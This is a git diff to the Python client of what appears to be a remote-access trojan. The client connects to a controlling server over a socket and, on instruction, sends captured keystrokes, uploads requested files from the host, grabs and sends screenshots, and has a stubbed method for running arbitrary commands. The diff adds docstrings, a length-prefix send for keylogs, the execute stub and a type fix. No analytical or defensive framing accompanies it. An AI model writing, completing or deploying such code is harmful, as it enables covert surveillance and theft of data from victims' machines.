@@ -1,5 +1,6 @@
 import os
 import io
+import sys
 import json
 import socket
 import threading
@@ -85,9 +86,17 @@ class Client:
     # Data handling ------------------------------------------------------------
 
     def _keylogs(self):
+        """Called upon a keylogs instruction, sends any captured keylogs to the server"""
         keylogs = self._keylogger.get_keylogs()
+        self._send(len(keylogs.encode("utf-8")))
+        self._send(keylogs)
 
     def _download(self, file_path: str):
+        """Called upon a download instruction, attempts to find the specified file and send it to the server
+
+        Args:
+            file_path (str): Path to the file to be sent
+        """
         print(file_path)
         print(os.path.isfile(file_path))
         file_size = 0
@@ -103,10 +112,15 @@ class Client:
                     self._send(data)
 
     def _screenshot(self):
+        """Called upon a screenshot instruction, captures an image of screen and sends to server"""
         img = io.BytesIO()
         ImageGrab.grab().save(img, format="PNG")
         self._send(str(img.tell()))
         self._send(img.getvalue())
+
+    def _execute(self, cmd: str):
+        """Called upon an execute instruction, executes the specified command on the client and sends any response to the server"""
+        ...
 
     def _handle_data(self, data: dict):
         cmd = data.get("cmd")
@@ -123,7 +137,7 @@ class Client:
 
     def _send(self, data: any) -> None:
         self._sock.sendall(
-            data.encode("utf-8") if not isinstance(data, bytes) else data
+            str(data).encode("utf-8") if not isinstance(data, bytes) else data
         )
 
     def _connect(self):
